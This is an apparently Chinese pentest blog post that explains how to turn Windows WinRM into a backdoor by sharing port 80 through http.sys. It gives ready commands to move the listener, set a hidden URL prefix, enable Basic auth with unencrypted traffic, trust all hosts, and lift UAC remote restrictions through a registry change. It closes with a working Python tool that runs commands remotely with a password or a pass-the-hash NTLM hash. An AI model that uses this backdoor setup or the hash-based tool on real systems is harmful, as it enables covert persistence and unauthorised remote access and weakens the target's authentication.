Title: winRM端口复用
Category: Pentest
Slug: winrm-backdoor
Date: 2019-10-23

###原理

基本原理是利用windows的远程管理服务WinRM,在Windows 2003 Server加入了内核级驱动程序(http.sys),用于监听http流量并根据URL进行处理，允许任意用户进程共享用于HTTP流量的TCP端口。通过http.sys,多个进程可以同时监听同一端口的HTTP流量

系统默认有10个DACl，可以通过`netsh http show urlacl`看到具体内容，其中5985是http端口，5986是https，在我的Windows Server 2012上面默认没有开启，只开启了一个5985端口。

###条件

Windows 2008默认不开启该服务，windows 2012以及以上默认开启该服务。

###开启服务
本地机器需要连接远程WinRM服务的时候，本地也需要开启WinRM服务，然后设置信任连接的主机，执行命令:

```
winrm quickconfig -q
winrm set winrm/config/Client @{TrustedHosts="*"}
```
连接(默认端口是5985，需要加上去):

```
winrs -r:http://<ip>:<port> -u:<user> -p:<pass> <command> 
```

###设置后门:

```
修改默认端口为80: winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}
还原为5985: winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="5985"}
设置URI: winrm set winrm/config/Listener?Address=*+Transport=HTTP @{URLPrefix="lalala"}
```

###常用命令

```
查看注册的URL: netsh http show servicestate
查看监听配置: winrm e winrm/config/listener
查看配置: winrm get winrm/config
新增80端口监听: winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}
删除80端口监听: winrm set winrm/config/service @{EnableCompatibilityHttpListener="false"}
```
###设置明文连接
使用pywinrm的时候，如果是直接使用账户密码，在transport可以不用设置，但是需要在服务端设置winrm使用不加密连接:

```
winrm set winrm/config/service/auth '@{Basic="true"}'
winrm set winrm/config/service '@{AllowUnencrypted="true"}'

s =  winrm.Session("http://192.168.1.26:5985",auth=("administrator","123456"))
```
当设置basic可以认证的时候，请求5985可以看到有两种认证方式: `Negotiate`和`basic`, `basic`和普通的head头认证一样，需要base64编码


###winrs.py

实现一个winrs的客户端，执行cmd命令。因为在pywirnm的源代码里面的powershell是这样的，他调用的还是run_cmd函数，而且是直接`powershell -encodedcommand`,这很不清。所以只需要完成执行cmd命令，自己写powershell调用就好了。

```
def run_ps(self, script):
        """base64 encodes a Powershell script and executes the powershell
        encoded script command
        """
        # must use utf16 little endian on windows
        encoded_ps = b64encode(script.encode('utf_16_le')).decode('ascii')
        rs = self.run_cmd('powershell -encodedcommand {0}'.format(encoded_ps))
        if len(rs.std_err):
            # if there was an error message, clean it it up and make it human
            # readable
            rs.std_err = self._clean_error_msg(rs.std_err)
        return rs
```
###成品

```
# 代码参考: https://lianzhang.org/index.php/archives/8/
#!/usr/bin/env python
# encoding: utf-8
import argparse
import urlparse
import requests
import winrm
import sys


def GetUrlState(url):
	r = requests.get(url)
	if r.status_code == 405:
		return True
	else:
		return False


def ParseUrl(url):
	parse = urlparse.urlparse(url)
	uri = parse.path
	ip = parse.netloc
	port = 80 if parse.port is None else parse.port
	return ip,port,uri


def RunCmd(ip,port,uri,cmd,**kwargs):
	if kwargs.get("hashpasswd"):
		try:
			Windwoscmd = winrm.Session('http://' + ip + ":" + str(port) + uri, auth=(kwargs.get("user"), '00000000000000000000000000000000:'+kwargs.get("hashpasswd")),
		                           transport="ntlm", server_cert_validation='ignore')
			Result = Windwoscmd.run_cmd(str(cmd))
			sys.stdout.write(Result.std_err.decode('gbk'))
			sys.stdout.write(Result.std_out.decode('gbk'))
			sys.stdout.write('\n')
		except Exception as ex:
			print "[+]> Hash发生错误:" + str(ex)
	else:
		try:
			Windwoscmd = winrm.Session('http://' + ip + ":" + str(port) + uri, auth=(kwargs.get("user"), kwargs.get("passwd")),
			                           transport="basic", server_cert_validation='ignore')
			Result = Windwoscmd.run_cmd(str(cmd))
			sys.stdout.write(Result.std_err.decode('gbk'))
			sys.stdout.write(Result.std_out.decode('gbk'))
			sys.stdout.write('\n')
		except Exception as ex:
			print "[+]> Pass发生错误:" + str(ex)


if __name__ == '__main__':
	#windows 2008上面是LM-HASH:NTLM-HASH的方式，需要修改源代码，去掉上面的一堆0加上冒号
	#windows 2012以及之后只能抓到NTLM的Hash，直接使用即可
	example_text = '''example:
	python winrs.py -r http://192.168.1.26:5985/wsman -u administrator -H 32ed87bdb5fdc5e9cba88547376818d4 -c "whoami"
	'''
	parser = argparse.ArgumentParser(description='WinRMTTools, only work >= Windows Server 2012',epilog=example_text)
	parser.add_argument("-r", "--remote", metavar="", required=True, help="http://192.168.1.26:5985/wsman")
	parser.add_argument("-u", "--user", metavar="", help="username", default="administrator")
	parser.add_argument("-p", "--passwd", metavar="", help="password", default="")
	parser.add_argument("-H", "--hashpasswd", metavar="", help="NTLM-Hash", default="")
	parser.add_argument("-c", "--command", metavar="", help="cmd", default="whoami")
	args = parser.parse_args()
	if GetUrlState(args.remote):
		ip, port, uri = ParseUrl(args.remote)
		RunCmd(ip, port, uri, args.command, user=args.user, passwd=args.passwd, hashpasswd=args.hashpasswd)
	else:
		print "[*]> Windwos WinRM服务未开启请检查服务是否开启！"
```

###注意事项
1. WinRM服务受UAC影响，本地管理员用户组只有administrator可以登录，其他管理员用户无法远程登录WinRM，如果要允许其他管理员用户远程登录WinRM，需要修改注册表:

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

2. 修改URLPrefix之后，因为pywinrm默认搜索wsman，所以如果修改URLPrefix之后程序需要重写。

* <https://www.cnblogs.com/0x4D75/p/11381449.html>
* <https://lianzhang.org/index.php/archives/8/>
* <https://paper.seebug.org/1004/>
* <https://threathunter.org/topic/5940a6e59c58e020408a79ea>
* <https://www.4hou.com/technology/19806.html>
